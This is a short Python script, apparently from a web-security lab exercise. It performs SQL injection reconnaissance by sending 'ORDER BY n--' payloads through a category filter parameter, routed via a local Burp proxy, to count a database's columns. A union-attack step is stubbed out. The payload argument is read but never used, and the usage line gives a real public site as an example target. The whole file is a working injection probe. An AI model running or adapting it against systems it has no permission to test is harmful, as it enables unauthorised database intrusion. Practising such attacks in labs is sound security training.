import sys

import requests

import urllib3

urllib3.disable_warnings()

# let the script go through the burp suite proxy
# for debuging purposes
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


# def union_attack(base_url, attack_payload):
#     pass


def order_attack(base_url):
    number_of_columns = 0
    for i in range(1, 50):
        uri = f"filter?category='ORDER BY {i}--"
        r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
        if r.status_code != 200:
            number_of_columns = i - 1
            break
    return number_of_columns


def exploit_sqli(base_url):
    number_of_columns = order_attack(base_url)
    return number_of_columns


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f'[-] Example: {sys.argv[0]} www.google.com" "1=1"')
        sys.exit(-1)

    if exploit_sqli(url) > 0:
        print(f"[+] Exploit successful, number of columns: {exploit_sqli(url)}")
    else:
        print("[-] Exploit failed")
